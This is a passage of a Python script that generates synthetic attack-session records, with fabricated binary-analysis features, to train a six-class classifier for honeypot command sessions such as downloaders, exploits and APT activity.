        'script_line_count', 'script_url_count', 'script_download_count',
        'script_arch_count', 'script_is_downloader', 'script_is_multi_arch',
        'script_is_miner', 'script_has_persistence', 'script_has_anti_forensics',
        'has_ghidra_results', 'has_angr_results', 'has_script_results',
        'deep_func_ratio_angr_ghidra', 'deep_mining_signal_count',
        'deep_total_network_indicators', 'deep_total_crypto_indicators',
        'deep_max_complexity', 'deep_total_evasion_indicators', 'deep_is_go_consensus',
    ]
    return {c: 0.0 for c in cols}


def generate_binary_features_downloader() -> Dict[str, float]:
    """Binary features for miner/botnet downloads."""
    f = get_zero_binary_features()
    if random.random() < 0.7:  # 70% have binary
        f['triage_file_size'] = random.uniform(50000, 5000000)
        f['triage_entropy'] = random.uniform(5.5, 7.5)
        f['triage_priority'] = random.uniform(40, 80)
        f['triage_score_mining'] = random.uniform(0.3, 1.0)
        f['triage_is_stripped'] = 1.0
        f['angr_has_network'] = 1.0
        f['angr_has_mining'] = random.choice([0.0, 1.0])
        f['deep_mining_signal_count'] = random.randint(1, 5)
        f['has_angr_results'] = 1.0
    return f


def generate_binary_features_exploit() -> Dict[str, float]:
    """Binary features for RATs/exploits."""
    f = get_zero_binary_features()
    if random.random() < 0.5:
        f['triage_file_size'] = random.uniform(30000, 2000000)
        f['triage_entropy'] = random.uniform(6.0, 7.9)
        f['triage_priority'] = random.uniform(50, 90)
        f['triage_is_packed'] = random.choice([0.0, 1.0])
        f['triage_is_stripped'] = 1.0
        f['ghidra_imports_network'] = random.randint(5, 20)
        f['ghidra_imports_evasion'] = random.randint(2, 10)
        f['angr_has_network'] = 1.0
        f['angr_syscalls_network'] = random.randint(3, 15)
        f['has_ghidra_results'] = 1.0
        f['has_angr_results'] = 1.0
    return f


def generate_binary_features_destructive() -> Dict[str, float]:
    """Binary features for destructive malware."""
    f = get_zero_binary_features()
    if random.random() < 0.4:
        f['triage_file_size'] = random.uniform(10000, 500000)
        f['triage_entropy'] = random.uniform(5.0, 7.0)
        f['triage_priority'] = random.uniform(60, 95)
        f['triage_score_destructive'] = random.uniform(0.5, 1.0)
        f['angr_has_file_manipulation'] = 1.0
        f['angr_syscalls_file_io'] = random.randint(5, 20)
        f['has_angr_results'] = 1.0
    return f


def generate_binary_features_apt() -> Dict[str, float]:
    """Binary features for APT implants (often Go binaries)."""
    f = get_zero_binary_features()
    if random.random() < 0.8:  # APTs usually have binaries
        f['triage_file_size'] = random.uniform(1000000, 30000000)  # Go binaries are large
        f['triage_entropy'] = random.uniform(5.0, 6.5)
        f['triage_priority'] = random.uniform(70, 100)
        f['triage_is_go'] = 1.0  # Key differentiator!
        f['triage_is_stripped'] = 1.0
        f['triage_score_botnet'] = random.uniform(0.3, 0.8)
        f['triage_score_mining'] = random.uniform(0.0, 0.5)
        f['ghidra_function_count'] = random.randint(1000, 5000)
        f['ghidra_go_user_functions'] = random.randint(50, 200)
        f['ghidra_go_runtime_functions'] = random.randint(500, 2000)
        f['ghidra_imports_network'] = random.randint(10, 30)
        f['ghidra_imports_crypto'] = random.randint(5, 15)
        f['angr_has_network'] = 1.0
        f['angr_has_persistence'] = 1.0
        f['angr_has_evasion'] = random.choice([0.0, 1.0])
        f['deep_is_go_consensus'] = 1.0
        f['has_ghidra_results'] = 1.0
        f['has_angr_results'] = 1.0
    return f


# =============================================================================
# Template Processing
# =============================================================================

def fill_template(template: str, vars_dict: Dict) -> str:
    """Fill template placeholders with random values."""
    result = template
    for var, values in vars_dict.items():
        placeholder = '{' + var + '}'
        while placeholder in result:
            result = result.replace(placeholder, random.choice(values), 1)
    return result


def generate_commands(templates: List, vars_dict: Dict, min_cmds: int, max_cmds: int) -> str:
    """Generate command string from templates."""
    n = random.randint(min_cmds, max_cmds)
    
    # Handle APT multi-stage (tuples of command sequences)
    if templates and isinstance(templates[0], tuple):
        # Pick a multi-stage sequence
        sequence = random.choice(templates)
        if isinstance(sequence[0], tuple):
            sequence = sequence[0]  # Nested tuple
        commands = [fill_template(cmd, vars_dict) for cmd in sequence[:n]]
    else:
        selected = random.choices(templates, k=n)
        commands = [fill_template(t, vars_dict) for t in selected]
    
    # Vary separator style
    sep = random.choice(['; ', ' && ', ' ; ', '; ', '; '])
    return sep.join(commands)


# =============================================================================
# Main Generator
# =============================================================================

class SyntheticGeneratorV2:
    """Comprehensive synthetic data generator for all 6 classes."""
    
    CLASS_CONFIGS = {
        0: ('Safe', SAFE_TEMPLATES, SAFE_VARS, compute_mitre_features_safe, get_zero_binary_features, 1, 5),
        1: ('Recon', RECON_TEMPLATES, RECON_VARS, compute_mitre_features_recon, get_zero_binary_features, 3, 12),
        2: ('Downloader', DOWNLOADER_TEMPLATES, DOWNLOADER_VARS, compute_mitre_features_downloader, generate_binary_features_downloader, 2, 6),
        3: ('Exploit', EXPLOIT_TEMPLATES, EXPLOIT_VARS, compute_mitre_features_exploit, generate_binary_features_exploit, 2, 8),
        4: ('Destructive', DESTRUCTIVE_TEMPLATES, DESTRUCTIVE_VARS, compute_mitre_features_destructive, generate_binary_features_destructive, 2, 8),
        5: ('ADVANCED_APT', APT_TEMPLATES, APT_VARS, compute_mitre_features_apt, generate_binary_features_apt, 5, 15),
    }
    
    def __init__(self, seed: int = 42):
        self.seed = seed
        random.seed(seed)
        np.random.seed(seed)
    
    def generate_session(self, class_id: int) -> Dict:
        """Generate a single session for the given class."""
        name, templates, vars_dict, mitre_fn, binary_fn, min_c, max_c = self.CLASS_CONFIGS[class_id]
        
        commands = generate_commands(templates, vars_dict, min_c, max_c)
        mitre = mitre_fn()
        binary = binary_fn()
        
        return {
            'session_id': f'synth_{name.lower()}_{random.randint(100000, 999999)}',
            'src_ip': f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
            'num_commands': commands.count(';') + commands.count('&&') + 1,
            'duration_sec': random.uniform(5, 1200),
            'commands': commands,
            'label_id': class_id,
            'label_name': name,
            **mitre,
            **binary,
            'num_downloads': 1 if binary.get('triage_file_size', 0) > 0 else 0,
            'download_shas': '',
        }
    
    def generate_batch(self, counts: Dict[int, int]) -> pd.DataFrame:
        """
        Generate batch with specified counts per class.
        
        Args:
            counts: {class_id: n_samples} e.g., {0: 1000, 1: 1000, ...}
        """
        sessions = []
        for class_id, n in counts.items():
            name = self.CLASS_CONFIGS[class_id][0]
            print(f"Generating {n} {name} sessions...")
            for _ in range(n):
                sessions.append(self.generate_session(class_id))
        
        df = pd.DataFrame(sessions)
        print(f"Total: {len(df)} sessions")
        return df
    
    def generate_balanced(self, n_per_class: int = 1000) -> pd.DataFrame:
        """Generate balanced dataset with n samples per class."""
        counts = {i: n_per_class for i in range(6)}
        return self.generate_batch(counts)


def main():
    """Generate and save comprehensive synthetic dataset."""
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--n-per-class', type=int, default=2000)
    parser.add_argument('--output', type=str, default='data/exports/synthetic_v2.csv')
    parser.add_argument('--seed', type=int, default=42)
    args = parser.parse_args()
    
    gen = SyntheticGeneratorV2(seed=args.seed)
    df = gen.generate_balanced(n_per_class=args.n_per_class)
    
    Path(args.output).parent.mkdir(parents=True, exist_ok=True)
    df.to_csv(args.output, index=False)
    print(f"Saved to {args.output}")
    
    # Print sample
    print("\n=== Samples ===")
    for class_id in range(6):
        sample = df[df['label_id'] == class_id].iloc[0]
        print(f"\n[{sample['label_name']}]")
        print(f"  {sample['commands'][:100]}...")


if __name__ == '__main__':
    main()
